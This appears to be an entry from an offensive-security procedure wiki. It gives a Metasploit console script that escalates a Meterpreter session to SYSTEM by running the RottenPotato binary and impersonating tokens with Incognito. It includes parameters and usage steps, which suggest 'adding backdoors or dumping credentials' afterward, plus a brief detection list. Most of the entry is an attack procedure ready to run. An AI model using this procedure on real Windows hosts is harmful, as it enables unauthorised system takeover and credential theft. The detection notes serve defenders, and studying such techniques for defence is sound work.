---
id: 471802d7-e4e7-46a0-ac2c-5be95f82633d
type: code
language: msfconsole
verified: true
created_at: '2023-04-06T03:56:30.139575+00:00'
updated_at: '2023-04-10T20:37:38.235079+00:00'
platforms:
  - Windows
tags:
  - token-impersonation
  - privilege-escalation
  - metasploit
validated: true
---

# Metasploit-Incognito-Token-Impersonation-with-RottenPotato

## Code

```msfconsole
getuid
getprivs
use incognito
list_tokens -u
cd c:\temp\
execute -Hc -f ./rot.exe
impersonate_token "NT AUTHORITY\SYSTEM"
```

## Description

This Metasploit console script performs privilege escalation by using the Incognito post-exploitation module to manipulate and impersonate access tokens after executing the RottenPotato exploit. It checks current privileges, enumerates available tokens, runs the RottenPotato binary to generate a SYSTEM token via DCOM abuse, and impersonates it for elevated session control.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| c:\temp\ | Path to directory containing rot.exe | c:\windows\temp\ |
| ./rot.exe | RottenPotato executable filename | rot.exe |
| NT AUTHORITY\SYSTEM | Target token to impersonate | lab\domainadmin |

## Usage

Execute this within an active Meterpreter session on a compromised Windows host. Ensure rot.exe is uploaded to the specified path beforehand. Use after initial access to escalate from user to SYSTEM level, enabling commands like adding backdoors or dumping credentials.

## Detection

- Monitor Meterpreter sessions via network beacons to Metasploit handlers.
- Sysmon Event ID 1 (Process Creation) for rot.exe execution.
- ETW logs for token duplication (Event ID 4656/4672 in Security log).
- Anomalous privilege changes in process trees.

## Related

- [[procedures/Elevating-Privileges-via-RottenPotato-and-Token-Impersonation]]
- [[tools/Metasploit-Framework]]
